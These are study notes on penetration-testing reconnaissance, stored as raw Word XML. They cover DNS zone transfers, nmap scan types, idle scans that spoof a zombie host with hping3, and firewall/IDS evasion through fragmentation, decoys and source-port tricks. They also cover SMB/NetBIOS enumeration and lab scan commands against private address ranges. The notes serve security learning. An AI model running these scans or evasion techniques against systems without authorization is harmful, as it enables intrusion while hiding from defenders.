    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000157">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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TCP, no ping (nmap -n -sn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RANGE)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 dns resolution, no portscan. Therefore if firewall drops pings. Can still discover</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000158">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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nameservers = Nslookup, server (dns serverIP), set q=NS, domainname</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000159">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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nameserverIP = Nslookup, server (dns serverIP), nameserver</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015A">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Zone Transfer (host -t axfr domainname serverIP OR dig @serverIP domain -t AXFR +nocookie</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="5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Allows enum of the entire dns record for the server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015C">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="50"/>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15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5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5F">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xrng1iqg8t0" w:id="57"/>
        <w:bookmarkEnd w:id="5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Scanning</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000160">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0dghdjcusug" w:id="58"/>
        <w:bookmarkEnd w:id="5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Three Way Handshake</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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Syn</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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Syn + Ack</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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Ack</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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Each has a sequence number. The ACK back is an increment of the initial SYN</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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6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 to send a TCP SYN packet ( can test for a SYN back back to see if port is open)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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j5xrdx03fd5" w:id="59"/>
        <w:bookmarkEnd w:id="59"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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rf0meyrmupar" w:id="60"/>
        <w:bookmarkEnd w:id="6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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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 -&gt; tcp syn scan,not a fill tcp connection. Half open scanning, syn -synack -rst</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000016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tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table5"/>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trHeight w:val="480" w:hRule="atLeast"/>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open</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Syn ack</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="480" w:hRule="atLeast"/>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Closed </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Rst + ack</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:trPr>
          <w:trHeight w:val="480" w:hRule="atLeast"/>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Filtered</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ICMP Unreachable</w:t>
              </w:r>
            </w:ins>
          </w:p>
          <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000171">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 response </w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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7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 → tcp connect scan</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000174">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>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Underlying os to establish a tcp connection to the ost. No raw packet used like with other scans</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000175">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200" w:line="312" w:lineRule="auto"/>
        <w:ind w:firstLine="72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Syn,synack,ack, rstack (full tcp communication)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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7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7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 → udp scan</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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sI → idle scan</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017B">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>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Zombie used in a target network, host that does not receive or send packets. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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 → verbosity mode, nmap determines the IP ID sequence, to see if it is incremental</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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l3ihe8aal4c5" w:id="61"/>
        <w:bookmarkEnd w:id="61"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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 never do dns resolution (generates a lot of noise)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000017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 bounce scan, ftb bounce attack, port command on ftp, launch scans from a vulnerable ftp server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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 ( TCP null, no bits scanned) sF (Fin, only sets the fin bit) sX (xmas scan, sets fin push and urg packets) → if tcp is sent a packet without the syn/rst/ack bits set. It returns a rst if is closed, and no response if open</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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 ack scan, used to map out rulesets of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firewalls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determine if devices are stateful. Only ack is set. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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 → ip protocol scan, enumerates type of ip protocols. Walks through the IP protocol field</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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8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xdbyl5r9snh" w:id="62"/>
        <w:bookmarkEnd w:id="6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Zombie IDLE Scan</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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Probe ip check value</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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Make syn packet, with source address of the zombie, send to port of ip.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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Probe ip check </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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Scan with nmap -sI idle scan and (Pn) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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8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8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8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ahr6iuuwlha" w:id="63"/>
        <w:bookmarkEnd w:id="6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Scripting Engine (NSE)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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/usr/share/nmap/scripts</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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--script-help “smb*” amd discovery</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018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--script script_name</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000190">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Smb-os-discovery</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000191">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Smb-enum-shares</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000192">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6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Default</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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9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3vbjybu3mhh" w:id="64"/>
        <w:bookmarkEnd w:id="6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HPing3 for Idle</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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Finding a zombie host = -r (relative ID) -S (syn), has to be done on an open port</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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9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Creating a packet pretending to be the zombie host</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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 spoof zombie address</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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 syn packet</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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 port</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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9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Monitor the zombie by running the initial finding a zombie command</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019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9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jt7x2z9eg96" w:id="65"/>
        <w:bookmarkEnd w:id="65"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019F">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wsge5cj2vpj" w:id="66"/>
        <w:bookmarkEnd w:id="66"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A0">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y1w6q78p0uly" w:id="67"/>
        <w:bookmarkEnd w:id="67"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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9q3crwoyko9" w:id="68"/>
        <w:bookmarkEnd w:id="6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Service Detection</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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bq7m6bwcyk1" w:id="69"/>
        <w:bookmarkEnd w:id="6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Banner Grabbing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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telnet, netcat, ncat. Read/write data. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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connection between two hosts or port 22. Responds with banner</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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Note:  HTTP services need data to be sent </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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5r056t8s4v5" w:id="70"/>
        <w:bookmarkEnd w:id="7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OS Fingerprinting</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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Passive fingerprinting → not sending packets to the target directly, intercepting traffic, analysing captured traffic</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>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P0f → passive fingerprinting tool , host uptime, operating system, TTL, user-agents  p0f -i eth0</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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Active fingerprinting → sends packets to the target</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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gn59763hwhd" w:id="71"/>
        <w:bookmarkEnd w:id="71"/>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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kys7uxjnt87" w:id="72"/>
        <w:bookmarkEnd w:id="7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LAB NOTES (@3)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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-sn -oX 10.50.96.0/23</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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-sS --top-ports 18 10.50.96.0/23</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A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Hping3 -S -P 20,53,135 10.50.97.5</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001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hping3 10.50.97.5 -S --scan known (top 1000)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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-sU 10.50.97.5</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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--source-port 53 -p 53 10.50.96.0/23 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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-O -v -iL iplist  --osscan-guess     (verbose to see if incremental)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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-sV -iL iplist</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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Hping3 -S -r -p ports ip → check before and after</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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Hping3 -a Zombie -S -p port ip</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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B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fers34lj57q" w:id="73"/>
        <w:bookmarkEnd w:id="7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Firewall / IDS Evasion</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B8">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j9l0twe4889" w:id="74"/>
        <w:bookmarkEnd w:id="7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Fragmentation </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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Splitting single Packet into smaller ones.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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Modern IDS may be able to stitch packets together.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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-sS -f IP ← fragment doesn't work with sT &amp; sV</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001BC">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wxh57s112z" w:id="75"/>
        <w:bookmarkEnd w:id="7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Decoys</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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Confuse ids with noise from a zombie</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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 for decoy</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B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kut7xtr50fq" w:id="76"/>
        <w:bookmarkEnd w:id="7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Timings</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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Slow scan to blend in </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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6gogzzr9cxe0" w:id="77"/>
        <w:bookmarkEnd w:id="7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Source Port</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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What port the firewall allows to go through</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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--source-port</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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CB">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hp1prcuhvuu" w:id="78"/>
        <w:bookmarkEnd w:id="7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Emuneration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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ujl85xwm6fz" w:id="79"/>
        <w:bookmarkEnd w:id="7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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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 over TCP / IP </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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Communicate over LAN; sharing, printers, files etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001C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 uses the following TCP &amp; UDP ports:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table6"/>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Protocol</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Service</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>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137</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UDP</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Name Services</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>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138</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UDP</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Datagram Services</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>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139</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TCP</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 Services</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D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D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NameService → like DNS record, translates &amp; maps NETBios to an IP address</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Table7"/>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1DE">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Nbstat -n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tl w:val="0"/>
                </w:rPr>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001D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Mapping of the BETBios name to service is done by WINS (win. Internet name service)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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Datagram Service → sending to a NETBIOS name, udp 138. Or broadcast to several computers at the same time.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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 Service → Session service to establish a connection to exchange data. Once established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Server message block (SMB)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is used.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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6akyagavrkz" w:id="80"/>
        <w:bookmarkEnd w:id="8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 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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 be sent directly over TCP/IP, without the need to run over NETBios (TCP 445)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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E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z81o6sjlx69" w:id="81"/>
        <w:bookmarkEnd w:id="8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NBStat</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001E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Nbstat -A IP </w:t>
        </w:r>
      </w:ins>
    </w:p>
